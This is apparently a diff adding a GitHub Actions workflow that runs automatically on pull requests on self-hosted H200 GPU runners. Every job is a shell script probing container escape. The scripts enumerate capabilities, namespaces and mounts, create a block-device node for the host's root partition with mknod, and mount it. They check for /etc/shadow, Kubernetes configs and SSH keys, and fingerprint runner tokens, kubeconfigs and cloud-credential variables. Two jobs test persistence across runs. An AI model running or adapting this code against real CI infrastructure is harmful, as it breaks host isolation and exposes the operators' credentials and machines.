@@ -1,0 +1,365 @@
+name: c211-126152-h200esc
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  escape-a:
+    runs-on: "8-gpu-h200"
+    timeout-minutes: 20
+    steps:
+      - name: h200-escape-precondition-escape-a
+        env:
+          NONCE: c211-126152-c37692e40348ca39
+          JOBTAG: escape-a
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_H200ESC_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID=$(id 2>&1 | head -c 400)"
+          echo "UNAME=$(uname -a 2>&1 | head -c 300)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1 | head -c 120)"
+          echo "PROC1_CMDLINE=$(tr '\0' ' ' < /proc/1/cmdline 2>/dev/null | head -c 300)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 600)"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent)"
+          echo "MACHINE_ID_SHA256=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)"
+          echo "HOSTNAME_SHA256=$(printf %s "$(hostname)" | sha256sum | cut -d' ' -f1)"
+          echo "=== A_PRIV ==="
+          grep -E '^(CapEff|CapBnd|CapPrm|CapInh|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -10
+          if command -v systemd-detect-virt >/dev/null 2>&1; then echo "SYSTEMD_DETECT_VIRT=$(systemd-detect-virt 2>&1 | head -c 120)"; fi
+          echo "APPARMOR_CURRENT=$(cat /proc/self/attr/current 2>/dev/null | head -c 160)"
+          echo "=== B_NS ==="
+          for n in mnt pid net uts ipc user cgroup; do echo "NS_${n}_SELF=$(readlink /proc/self/ns/$n 2>&1) NS_${n}_PID1=$(readlink /proc/1/ns/$n 2>&1)"; done
+          echo "=== C_MOUNTINFO ==="
+          echo "MOUNTINFO_LINES=$(wc -l < /proc/self/mountinfo 2>/dev/null)"
+          echo "MOUNTINFO_BLOCK_BACKED_BEGIN"
+          awk '{print "MI_BLOCK dev="$3" root="$4" mnt="$5" fstype="$9" src="$10}' /proc/self/mountinfo 2>/dev/null | grep '/dev/' | head -20
+          echo "MOUNTINFO_BLOCK_BACKED_END"
+          echo "MOUNTINFO_ROOT_BEGIN"
+          awk '$5=="/" {print "MI_ROOT", $0}' /proc/self/mountinfo 2>/dev/null | head -4
+          echo "MOUNTINFO_ROOT_END"
+          echo "HOST_BIND_CANDIDATES_BEGIN"
+          grep -E '(/var/lib/docker|/var/lib/containerd|/run/containerd|/etc/kubernetes|/dev/nvidia|/var/lib/kubelet|/host)' /proc/self/mountinfo 2>/dev/null | head -20
+          echo "HOST_BIND_CANDIDATES_END"
+          echo "=== D_PROC1_ROOT ==="
+          P1R=$(readlink /proc/1/root 2>&1)
+          SR=$(readlink /proc/self/root 2>&1)
+          echo "PROC1_ROOT_LINK=$P1R SELF_ROOT_LINK=$SR SAME=$([ "$P1R" = "$SR" ] && echo yes || echo no)"
+          ls -la /proc/1/root/ 2>&1 | head -30
+          echo "=== E_PARTITIONS ==="
+          cat /proc/partitions 2>&1 | head -40
+          echo "=== F_DEV_BLOCK ==="
+          echo "DEV_BLOCK_COUNT=$(ls -l /dev 2>/dev/null | grep -c '^b')"
+          ls -l /dev 2>&1 | grep '^b' | head -20
+          ls -l /dev/nvidia* 2>&1 | head -12
+          echo "=== G_BLOCK_DEVICE_TEST ==="
+          mkdir -p /tmp/c211-126152-esc 2>/dev/null
+          NODE=/tmp/c211-126152-esc/hostroot-blk
+          MNT=/tmp/c211-126152-esc/hostroot
+          SB=/tmp/c211-126152-esc/sb.bin
+          rm -f "$NODE" "$SB" 2>/dev/null
+          MM=""
+          if [ -r /proc/1/mountinfo ]; then MM=$(awk '$5=="/" {print $3; exit}' /proc/1/mountinfo 2>/dev/null); fi
+          echo "PID1_ROOT_MM=${MM:-none}"
+          BLKNAME=""
+          MJ=""
+          MI=""
+          if [ -n "${MM:-}" ]; then
+            MJX=${MM%%:*}
+            MIX=${MM##*:}
+            BLKNAME=$(awk -v mj="$MJX" -v mi="$MIX" '$1==mj && $2==mi {print $4; exit}' /proc/partitions 2>/dev/null)
+            echo "PID1_ROOT_MM_MATCH=${BLKNAME:-none}"
+          fi
+          if [ -z "${BLKNAME:-}" ]; then
+            CAND=$(awk 'NR>2 && $3>0 {print $1, $2, $3, $4}' /proc/partitions 2>/dev/null | sort -k3 -nr | head -1)
+            echo "FALLBACK_LARGEST_PART=$CAND"
+            if [ -n "$CAND" ]; then set -- $CAND; MJ=$1; MI=$2; BLKNAME=$4; fi
+          else
+            MJ=$MJX
+            MI=$MIX
+          fi
+          echo "MKNOD_TARGET name=${BLKNAME:-none} mm=${MJ:-?}:${MI:-?}"
+          if [ -n "${MJ:-}" ] && [ -n "${MI:-}" ]; then
+            MOUT=$(mknod "$NODE" b "$MJ" "$MI" 2>&1)
+            MRC=$?
+            echo "MKNOD_RC=$MRC MKNOD_OUT=$(echo "$MOUT" | head -c 300 | tr '\n' ' ')"
+            if [ "$MRC" -eq 0 ] && [ -b "$NODE" ]; then
+              RDERR=/tmp/c211-126152-esc/read.err
+              rm -f "$RDERR" "$SB" 2>/dev/null
+              timeout 25 head -c 4096 "$NODE" > "$SB" 2>"$RDERR"
+              DRC=$?
+              echo "BLKDEV_READ_RC=$DRC READ_ERR_VERBATIM=$(head -c 400 "$RDERR" 2>/dev/null | tr '\n' ' ')"
+              if [ "$DRC" -eq 0 ] && [ -s "$SB" ]; then
+                echo "BLKDEV_READ_BYTES=$(stat -c %s "$SB" 2>/dev/null)"
+                echo "BLKDEV_SHA256=$(sha256sum "$SB" 2>/dev/null | cut -d' ' -f1)"
+                echo "BLKDEV_SIG_OFF1024=$(od -An -tx1 -j 1024 -N 16 "$SB" 2>/dev/null | tr -d ' \n')"
+                mkdir -p "$MNT" 2>/dev/null
+                UOUT=$(timeout 30 mount -o ro,noload "$NODE" "$MNT" 2>&1)
+                URC=$?
+                echo "MOUNT_RO_NOLOAD_RC=$URC MOUNT_OUT=$(echo "$UOUT" | head -c 300 | tr '\n' ' ')"
+                if [ "$URC" -eq 0 ]; then
+                  MID=$(sha256sum "$MNT/etc/machine-id" 2>/dev/null | cut -d' ' -f1)
+                  HID=$(printf %s "$(cat "$MNT/etc/hostname" 2>/dev/null | head -c 255)" | sha256sum | cut -d' ' -f1)
+                  CMID=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)
+                  echo "MOUNTED_MACHINE_ID_SHA256=$MID"
+                  echo "MOUNTED_HOSTNAME_SHA256=$HID"
+                  echo "MOUNTED_PRESENT_ETC_SHADOW=$([ -e "$MNT/etc/shadow" ] && echo present || echo absent)"
+                  echo "MOUNTED_PRESENT_ETC_KUBERNETES=$([ -d "$MNT/etc/kubernetes" ] && echo present || echo absent)"
+                  echo "MOUNTED_PRESENT_ROOT_SSH=$([ -d "$MNT/root/.ssh" ] && echo present || echo absent)"
+                  echo "MOUNTED_IDENTITY_MATCHES_CONTAINER=$([ "$MID" = "$CMID" ] && echo yes || echo no)"
+                  timeout 20 umount "$MNT" >/dev/null 2>&1
+                  echo "UMOUNT_RC=$?"
+                fi
+              fi
+            fi
+          fi
+          rm -f "$NODE" "$SB" 2>/dev/null
+          rmdir "$MNT" 2>/dev/null
+          echo "G_TEST_DONE"
+          echo "=== H_CREDS ==="
+          digest(){
+            p="$1"
+            if [ -e "$p" ]; then
+              s=$(sha256sum "$p" 2>/dev/null | cut -c1-32)
+              sz=$(stat -c %s "$p" 2>/dev/null)
+              echo "CRED_PATH=$p PRESENT SHA256_32=$s SIZE=$sz"
+            else
+              echo "CRED_PATH=$p ABSENT"
+            fi
+          }
+          digest /home/runner/actions-runner/.credentials
+          digest /home/runner/actions-runner/.runner
+          digest /etc/kubernetes/kubelet.conf
+          digest /etc/kubernetes/admin.conf
+          for f in /root/.ssh/id_* /home/*/.ssh/id_*; do [ -e "$f" ] && digest "$f"; done
+          digest /root/.docker/config.json
+          digest /home/runner/.docker/config.json
+          echo "ENV_PRESENCE_BEGIN"
+          env | cut -d= -f1 | grep -E '^(AWS_|GOOGLE_|AZURE_|KUBERNETES_SERVICE_HOST$)' | sort | head -40
+          echo "ENV_PRESENCE_END"
+          echo "=== I_GPU ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 40 nvidia-smi -L 2>&1 | head -16
+            timeout 40 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -16
+            echo "NVIDIA_GPU_COUNT=$(timeout 40 nvidia-smi -L 2>/dev/null | grep -c '^GPU')"
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "C211_H200ESC_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  escape-b:
+    runs-on: "8-gpu-h200"
+    timeout-minutes: 20
+    steps:
+      - name: h200-escape-precondition-escape-b
+        env:
+          NONCE: c211-126152-c37692e40348ca39
+          JOBTAG: escape-b
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_H200ESC_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID=$(id 2>&1 | head -c 400)"
+          echo "UNAME=$(uname -a 2>&1 | head -c 300)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1 | head -c 120)"
+          echo "PROC1_CMDLINE=$(tr '\0' ' ' < /proc/1/cmdline 2>/dev/null | head -c 300)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 600)"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent)"
+          echo "MACHINE_ID_SHA256=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)"
+          echo "HOSTNAME_SHA256=$(printf %s "$(hostname)" | sha256sum | cut -d' ' -f1)"
+          echo "=== A_PRIV ==="
+          grep -E '^(CapEff|CapBnd|CapPrm|CapInh|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -10
+          if command -v systemd-detect-virt >/dev/null 2>&1; then echo "SYSTEMD_DETECT_VIRT=$(systemd-detect-virt 2>&1 | head -c 120)"; fi
+          echo "APPARMOR_CURRENT=$(cat /proc/self/attr/current 2>/dev/null | head -c 160)"
+          echo "=== B_NS ==="
+          for n in mnt pid net uts ipc user cgroup; do echo "NS_${n}_SELF=$(readlink /proc/self/ns/$n 2>&1) NS_${n}_PID1=$(readlink /proc/1/ns/$n 2>&1)"; done
+          echo "=== C_MOUNTINFO ==="
+          echo "MOUNTINFO_LINES=$(wc -l < /proc/self/mountinfo 2>/dev/null)"
+          echo "MOUNTINFO_BLOCK_BACKED_BEGIN"
+          awk '{print "MI_BLOCK dev="$3" root="$4" mnt="$5" fstype="$9" src="$10}' /proc/self/mountinfo 2>/dev/null | grep '/dev/' | head -20
+          echo "MOUNTINFO_BLOCK_BACKED_END"
+          echo "MOUNTINFO_ROOT_BEGIN"
+          awk '$5=="/" {print "MI_ROOT", $0}' /proc/self/mountinfo 2>/dev/null | head -4
+          echo "MOUNTINFO_ROOT_END"
+          echo "HOST_BIND_CANDIDATES_BEGIN"
+          grep -E '(/var/lib/docker|/var/lib/containerd|/run/containerd|/etc/kubernetes|/dev/nvidia|/var/lib/kubelet|/host)' /proc/self/mountinfo 2>/dev/null | head -20
+          echo "HOST_BIND_CANDIDATES_END"
+          echo "=== D_PROC1_ROOT ==="
+          P1R=$(readlink /proc/1/root 2>&1)
+          SR=$(readlink /proc/self/root 2>&1)
+          echo "PROC1_ROOT_LINK=$P1R SELF_ROOT_LINK=$SR SAME=$([ "$P1R" = "$SR" ] && echo yes || echo no)"
+          ls -la /proc/1/root/ 2>&1 | head -30
+          echo "=== E_PARTITIONS ==="
+          cat /proc/partitions 2>&1 | head -40
+          echo "=== F_DEV_BLOCK ==="
+          echo "DEV_BLOCK_COUNT=$(ls -l /dev 2>/dev/null | grep -c '^b')"
+          ls -l /dev 2>&1 | grep '^b' | head -20
+          ls -l /dev/nvidia* 2>&1 | head -12
+          echo "=== G_BLOCK_DEVICE_TEST ==="
+          mkdir -p /tmp/c211-126152-esc 2>/dev/null
+          NODE=/tmp/c211-126152-esc/hostroot-blk
+          MNT=/tmp/c211-126152-esc/hostroot
+          SB=/tmp/c211-126152-esc/sb.bin
+          rm -f "$NODE" "$SB" 2>/dev/null
+          MM=""
+          if [ -r /proc/1/mountinfo ]; then MM=$(awk '$5=="/" {print $3; exit}' /proc/1/mountinfo 2>/dev/null); fi
+          echo "PID1_ROOT_MM=${MM:-none}"
+          BLKNAME=""
+          MJ=""
+          MI=""
+          if [ -n "${MM:-}" ]; then
+            MJX=${MM%%:*}
+            MIX=${MM##*:}
+            BLKNAME=$(awk -v mj="$MJX" -v mi="$MIX" '$1==mj && $2==mi {print $4; exit}' /proc/partitions 2>/dev/null)
+            echo "PID1_ROOT_MM_MATCH=${BLKNAME:-none}"
+          fi
+          if [ -z "${BLKNAME:-}" ]; then
+            CAND=$(awk 'NR>2 && $3>0 {print $1, $2, $3, $4}' /proc/partitions 2>/dev/null | sort -k3 -nr | head -1)
+            echo "FALLBACK_LARGEST_PART=$CAND"
+            if [ -n "$CAND" ]; then set -- $CAND; MJ=$1; MI=$2; BLKNAME=$4; fi
+          else
+            MJ=$MJX
+            MI=$MIX
+          fi
+          echo "MKNOD_TARGET name=${BLKNAME:-none} mm=${MJ:-?}:${MI:-?}"
+          if [ -n "${MJ:-}" ] && [ -n "${MI:-}" ]; then
+            MOUT=$(mknod "$NODE" b "$MJ" "$MI" 2>&1)
+            MRC=$?
+            echo "MKNOD_RC=$MRC MKNOD_OUT=$(echo "$MOUT" | head -c 300 | tr '\n' ' ')"
+            if [ "$MRC" -eq 0 ] && [ -b "$NODE" ]; then
+              RDERR=/tmp/c211-126152-esc/read.err
+              rm -f "$RDERR" "$SB" 2>/dev/null
+              timeout 25 head -c 4096 "$NODE" > "$SB" 2>"$RDERR"
+              DRC=$?
+              echo "BLKDEV_READ_RC=$DRC READ_ERR_VERBATIM=$(head -c 400 "$RDERR" 2>/dev/null | tr '\n' ' ')"
+              if [ "$DRC" -eq 0 ] && [ -s "$SB" ]; then
+                echo "BLKDEV_READ_BYTES=$(stat -c %s "$SB" 2>/dev/null)"
+                echo "BLKDEV_SHA256=$(sha256sum "$SB" 2>/dev/null | cut -d' ' -f1)"
+                echo "BLKDEV_SIG_OFF1024=$(od -An -tx1 -j 1024 -N 16 "$SB" 2>/dev/null | tr -d ' \n')"
+                mkdir -p "$MNT" 2>/dev/null
+                UOUT=$(timeout 30 mount -o ro,noload "$NODE" "$MNT" 2>&1)
+                URC=$?
+                echo "MOUNT_RO_NOLOAD_RC=$URC MOUNT_OUT=$(echo "$UOUT" | head -c 300 | tr '\n' ' ')"
+                if [ "$URC" -eq 0 ]; then
+                  MID=$(sha256sum "$MNT/etc/machine-id" 2>/dev/null | cut -d' ' -f1)
+                  HID=$(printf %s "$(cat "$MNT/etc/hostname" 2>/dev/null | head -c 255)" | sha256sum | cut -d' ' -f1)
+                  CMID=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)
+                  echo "MOUNTED_MACHINE_ID_SHA256=$MID"
+                  echo "MOUNTED_HOSTNAME_SHA256=$HID"
+                  echo "MOUNTED_PRESENT_ETC_SHADOW=$([ -e "$MNT/etc/shadow" ] && echo present || echo absent)"
+                  echo "MOUNTED_PRESENT_ETC_KUBERNETES=$([ -d "$MNT/etc/kubernetes" ] && echo present || echo absent)"
+                  echo "MOUNTED_PRESENT_ROOT_SSH=$([ -d "$MNT/root/.ssh" ] && echo present || echo absent)"
+                  echo "MOUNTED_IDENTITY_MATCHES_CONTAINER=$([ "$MID" = "$CMID" ] && echo yes || echo no)"
+                  timeout 20 umount "$MNT" >/dev/null 2>&1
+                  echo "UMOUNT_RC=$?"
+                fi
+              fi
+            fi
+          fi
+          rm -f "$NODE" "$SB" 2>/dev/null
+          rmdir "$MNT" 2>/dev/null
+          echo "G_TEST_DONE"
+          echo "=== H_CREDS ==="
+          digest(){
+            p="$1"
+            if [ -e "$p" ]; then
+              s=$(sha256sum "$p" 2>/dev/null | cut -c1-32)
+              sz=$(stat -c %s "$p" 2>/dev/null)
+              echo "CRED_PATH=$p PRESENT SHA256_32=$s SIZE=$sz"
+            else
+              echo "CRED_PATH=$p ABSENT"
+            fi
+          }
+          digest /home/runner/actions-runner/.credentials
+          digest /home/runner/actions-runner/.runner
+          digest /etc/kubernetes/kubelet.conf
+          digest /etc/kubernetes/admin.conf
+          for f in /root/.ssh/id_* /home/*/.ssh/id_*; do [ -e "$f" ] && digest "$f"; done
+          digest /root/.docker/config.json
+          digest /home/runner/.docker/config.json
+          echo "ENV_PRESENCE_BEGIN"
+          env | cut -d= -f1 | grep -E '^(AWS_|GOOGLE_|AZURE_|KUBERNETES_SERVICE_HOST$)' | sort | head -40
+          echo "ENV_PRESENCE_END"
+          echo "=== I_GPU ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 40 nvidia-smi -L 2>&1 | head -16
+            timeout 40 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -16
+            echo "NVIDIA_GPU_COUNT=$(timeout 40 nvidia-smi -L 2>/dev/null | grep -c '^GPU')"
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "C211_H200ESC_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  chain-p1:
+    runs-on: "8-gpu-h200"
+    timeout-minutes: 20
+    steps:
+      - name: h200-escape-precondition-chain-p1
+        env:
+          NONCE: c211-126152-c37692e40348ca39
+          JOBTAG: chain-p1
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_H200ESC_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID=$(id 2>&1 | head -c 400)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 600)"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent)"
+          echo "MACHINE_ID_SHA256=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)"
+          echo "HOSTNAME_SHA256=$(printf %s "$(hostname)" | sha256sum | cut -d' ' -f1)"
+          echo "CONTAINER_ID_FROM_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | grep -oE '[0-9a-f]{12,64}' | head -1)"
+          grep -E '^(CapEff|CapBnd|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -8
+          P=/tmp/.c211-126152-persist
+          printf '%s\n' "$NONCE" > "$P"
+          echo "P1_WRITE_RC=$? PATH=$P"
+          echo "P1_FILE_SHA256=$(sha256sum "$P" 2>/dev/null | cut -d' ' -f1)"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 40 nvidia-smi -L 2>&1 | head -16
+            timeout 40 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -16
+          fi
+          echo "C211_H200ESC_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  chain-p2:
+    needs: chain-p1
+    runs-on: "8-gpu-h200"
+    timeout-minutes: 20
+    steps:
+      - name: h200-escape-precondition-chain-p2
+        env:
+          NONCE: c211-126152-c37692e40348ca39
+          JOBTAG: chain-p2
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_H200ESC_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID=$(id 2>&1 | head -c 400)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 600)"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent)"
+          echo "MACHINE_ID_SHA256=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)"
+          echo "HOSTNAME_SHA256=$(printf %s "$(hostname)" | sha256sum | cut -d' ' -f1)"
+          echo "CONTAINER_ID_FROM_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | grep -oE '[0-9a-f]{12,64}' | head -1)"
+          grep -E '^(CapEff|CapBnd|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -8
+          P=/tmp/.c211-126152-persist
+          echo "P2_PRESENT=$([ -f "$P" ] && echo PRESENT || echo ABSENT)"
+          if [ -f "$P" ]; then
+            echo "P2_FILE_SHA256=$(sha256sum "$P" 2>/dev/null | cut -d' ' -f1)"
+            echo "P2_NONCE_MATCH=$([ "$(head -c 64 "$P" 2>/dev/null)" = "$NONCE" ] && echo yes || echo no)"
+          fi
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 40 nvidia-smi -L 2>&1 | head -16
+            timeout 40 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -16
+          fi
+          echo "C211_H200ESC_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
